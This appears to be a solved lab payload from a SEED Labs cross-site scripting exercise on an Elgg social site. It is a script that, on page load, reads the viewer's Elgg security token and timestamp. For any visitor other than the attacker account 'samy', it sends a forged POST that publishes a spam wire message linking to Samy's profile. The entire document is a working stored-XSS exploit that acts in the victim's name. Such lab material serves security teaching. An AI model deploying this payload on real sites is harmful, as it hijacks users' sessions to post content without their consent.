<script type="text/javascript">
    window.onload = function(){
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var post="&body="+"To earn 12 USD/Hour(!), visit now\n"+"http://www.seed-server.com/profile/samy"+"&accesslevel[body]=1";

    //Construct the content of your url.
    var sendurl="http://www.seed-server.com/action/thewire/add"; //FILL IN

    var content=token+ts+post; //FILL IN
    var samyId=59;
    if(elgg.session.user.guid!=samyId)
    {
            //Create and send Ajax request to modify profile
            var Ajax=null;
    Ajax=new XMLHttpRequest();
    Ajax.open("POST",sendurl,true);
    Ajax.setRequestHeader("Host","www.seed-server.com");
    Ajax.setRequestHeader("Content-Type",
    "application/x-www-form-urlencoded");
    Ajax.send(content);
        }
	}
</script>